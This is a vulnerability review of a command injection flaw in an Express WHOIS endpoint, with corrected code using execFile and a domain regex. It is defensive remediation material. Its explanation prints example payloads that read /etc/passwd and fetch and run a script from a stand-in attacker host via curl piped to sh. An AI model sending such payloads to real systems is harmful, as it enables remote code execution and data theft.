## Verdict

Confirmed. `req.query.domain` flows unsanitized into a shell string executed via `child_process.exec`, allowing OS command injection.

## Source

`req.query.domain` at line 8 (`WhoisLookupChildProcess.js`) — attacker-controlled Express query parameter, e.g. `GET /whois?domain=example.com`.

## Fix

```javascript
const express = require('express');
const { execFile } = require('child_process');

const app = express();

// Only allow characters valid in a DNS hostname/domain label.
const DOMAIN_PATTERN = /^[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?(\.[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?)+$/;

// Looks up WHOIS registration details for a domain the caller wants to check.
app.get('/whois', (req, res) => {
  const domain = req.query.domain;

  if (!domain) {
    return res.status(400).send('domain query parameter is required');
  }

  if (typeof domain !== 'string' || !DOMAIN_PATTERN.test(domain)) {
    return res.status(400).send('invalid domain');
  }

  execFile('whois', [domain], (error, stdout, stderr) => {
    if (error) {
      return res.status(500).send('whois lookup failed');
    }
    res.type('text/plain').send(stdout);
  });
});

app.listen(3000);

module.exports = app;
```

## Explanation

The original code builds a shell command string with template interpolation (`` `whois ${domain}` ``) and runs it through `exec`, which spawns `/bin/sh -c <string>`. Because the shell parses the full string, any shell metacharacter in `domain` (`;`, `|`, `&&`, backticks, `$()`, etc.) lets the caller append or chain arbitrary commands — e.g. `?domain=example.com;cat+/etc/passwd` or `?domain=$(curl+attacker.com/x|sh)`.

The fix has two independent layers:

1. **Eliminate the shell.** `execFile('whois', [domain], cb)` invokes the `whois` binary directly via `execve`-style spawning with an argument array, never a shell. There is no shell metacharacter interpretation at all, so injection via `;`, `|`, backticks, etc. is structurally impossible regardless of `domain`'s contents.
2. **Validate the input as defense in depth.** `DOMAIN_PATTERN` restricts `domain` to a syntactically valid DNS hostname (alphanumeric labels, hyphens not at label edges, dot-separated), rejecting anything that isn't a plausible domain name before it ever reaches `execFile`. This also blocks option/flag injection: a value like `-h` or `--verbose` (which `execFile`'s argument array alone would not stop from being read as a `whois` flag) cannot match the pattern because it doesn't start with an alphanumeric label character.

Together these close both the shell-injection vector and the narrower flag-injection vector that an argument array by itself does not cover.
